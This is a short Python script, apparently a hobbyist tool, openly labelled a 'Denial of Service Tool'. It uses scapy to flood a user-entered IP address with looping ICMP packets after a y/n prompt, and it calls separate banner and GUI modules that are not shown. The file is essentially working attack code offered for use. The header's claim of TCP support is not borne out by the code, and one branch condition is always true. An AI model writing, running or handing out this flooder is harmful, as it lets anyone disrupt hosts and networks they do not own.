# # Created in Python | 5/02/2024 | Denial of Service Tool | Supports TCP, ICMP at given date.
# Created by StaleCrescent65

from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP
import time
import os
import banners
import gui

def gui_version():
    gui.main()


def cli_version():
    os.system('cls')
    banners.dos_banner()
    print('')
    print(' Enter the destination IP. ')
    ip_entry = input(' ENTER IP: ')
    prompt = input(' do you want to start the packet flood y/n?: ')
    if prompt == 'y':
        icmp_flood = IP(dst=ip_entry) / ICMP(type=9)
        send(icmp_flood, loop=True)
    elif 'n':
        main()


def main():
    os.system('cls')
    method_options = input('''
 Denial of Service tool | made by 0x4155
 
 1) GUI Version (Simpler)
 2) CLI Version (Harder)

 >> ''')
    if method_options == '1':
        gui_version()
    elif method_options == '2':
        cli_version()
    else:
        print('Please select from the following using 1 or 2.')
        time.sleep(2)
        main()


def welcome_msg():
    os.system('cls')
    get_user = os.getlogin()
    print(f'\n Welcome {get_user}!')
    time.sleep(2)
    main()


if __name__ == "__main__":
    welcome_msg()
